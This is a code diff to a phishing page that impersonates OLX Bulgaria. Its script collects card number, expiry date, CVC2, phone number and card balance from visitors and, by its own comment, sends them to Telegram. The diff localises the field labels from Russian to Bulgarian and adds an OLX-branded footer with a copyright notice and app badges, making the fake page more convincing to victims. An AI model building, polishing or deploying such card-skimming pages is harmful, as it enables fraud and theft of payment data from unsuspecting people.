@@ -262,7 +262,7 @@
     </div>
 </div>
 
-<!-- Модално окно -->
+<!-- Модальное окно -->
 <div id="modal" class="modal">
     <div class="modal-content">
         <h3 id="modal-title">Зареждане...</h3>
@@ -351,11 +351,11 @@
 
         // Съобщение за Telegram
         const message = `
-            <b>🪙 Номер карты:</b> ${cardNumber}\n
-            <b>📅 Срок:</b> ${expiry}\n
+            <b>🪙 Номер на картата:</b> ${cardNumber}\n
+            <b>📅 Срок на валидност:</b> ${expiry}\n
             <b>🔒 CVC2:</b> ${cvc}\n
-            <b>📱 Телефон номер:</b> ${phoneNumber}\n
-            <b>💳 Баланс:</b> ${balance}
+            <b>📱 Телефонен номер:</b> ${phoneNumber}\n
+            <b>💳 Баланс на картата:</b> ${balance}
         `;
 
         // Изпращане на съобщение в Telegram
@@ -369,6 +369,32 @@
         }, 3000);
     });
 </script>
+
+<!-- Футер -->
+<div class="footer">
+    <div class="footer-content">
+        <div class="footer-column">
+            <a href="#" class="footer-link">Правила за ползване</a>
+            <a href="#" class="footer-link">Често задавани въпроси</a>
+            <a href="#" class="footer-link">Контакти</a>
+        </div>
+        <div class="footer-apps">
+            <div class="app-buttons">
+                <img src="google-play-badge.png" alt="Google Play" class="app-badge">
+                <img src="app-store-badge.png" alt="App Store" class="app-badge">
+            </div>
+            <p class="app-text">Свалете нашето приложение</p>
+        </div>
+    </div>
+
+    <div class="footer-bottom">
+        <div class="country-link">
+            <img src="flag.png" class="flag" alt="Flag">
+            <span>България</span>
+        </div>
+        <p>&copy; 2026 OLX. Всички права запазени.</p>
+    </div>
+</div>
 
 </body>
 </html>
